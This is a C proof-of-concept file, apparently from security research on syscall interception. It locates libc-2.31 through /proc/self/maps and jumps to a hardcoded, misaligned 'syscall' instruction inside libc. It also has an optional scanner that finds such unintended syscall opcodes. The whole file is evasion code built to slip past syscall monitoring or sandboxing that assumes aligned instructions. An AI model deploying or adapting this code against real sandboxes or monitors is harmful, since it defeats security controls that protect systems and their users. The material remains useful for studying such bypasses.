#define _GNU_SOURCE
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <ucontext.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <fcntl.h>

#include "_libattack.h"

#define FIND_INSTRUCTION 0

const int instruction_offset = 0x2990a;


void scan_pages(char* start, char* end){
    for(char* ptr = start + 5; ptr < (end - 1); ptr++){

        // syscall opcode
        if((unsigned char)ptr[0] == 0x0F &&
           (unsigned char)ptr[1] == 0x05){

            // previous instruction is NOT:
            // mov eax, imm32
            //
            // B8 xx xx xx xx
            //
            if((unsigned char)ptr[-5] != 0xB8){
                printf("suspicious syscall found at %p\n", ptr);
                asm("pushq %%rdi\n"
                    "movq %[addr], %%rdi\n"
                    "int3\n"
                    "popq %%rdi\n"
                :
                :[addr]"r"(ptr));
            }
        }
    }
}

int state = 0;
size_t get_mappings(){
    FILE *maps_file = fopen("/proc/self/maps", "r");

    if (maps_file == NULL) {
        fprintf(stderr, "could not open proc/self/maps\n");
        exit(1);
    }

    char* end_ptr;
    char line[256];
    while (fgets(line, sizeof(line), maps_file) != NULL) {

        //fprintf(stderr, "%s", line);
        end_ptr = line;
        if (!*end_ptr) continue;

#if !FIND_INSTRUCTION
        if(strstr(line, "/usr/lib/x86_64-linux-gnu/libc-2.31.so")){
            if(state == 0) state = 1;
            if(state == 2) return strtoll(end_ptr, &end_ptr, 16) + instruction_offset;
        }else{
            if(state == 1) state = 2;
        }
        continue;
#endif

        if(!strstr(line, "/usr/lib/x86_64-linux-gnu/libc-2.31.so")) continue;
        //extract start and end adress of memory maping
        //star_adress-end_adress rwxp ....
        uint64_t mapping_start = strtoll(end_ptr, &end_ptr, 16);


        if(mapping_start>=0x7fffffffffffffff)continue; //ignore vsyscall pages
        assert(*end_ptr++ == '-');
        uint64_t mapping_end = strtoll(end_ptr, &end_ptr, 16);

        if(!strstr(line, "xp")) continue;
        scan_pages((char*)mapping_start, (char*)mapping_end);
    }
}

int main(){
    char* instruction = (char*)get_mappings();
    printf("found misalligned syscall instruction: %p\n", instruction);

    void(*fn)(void) = (void(*)(void))instruction;

    fn();
    exit(0);
}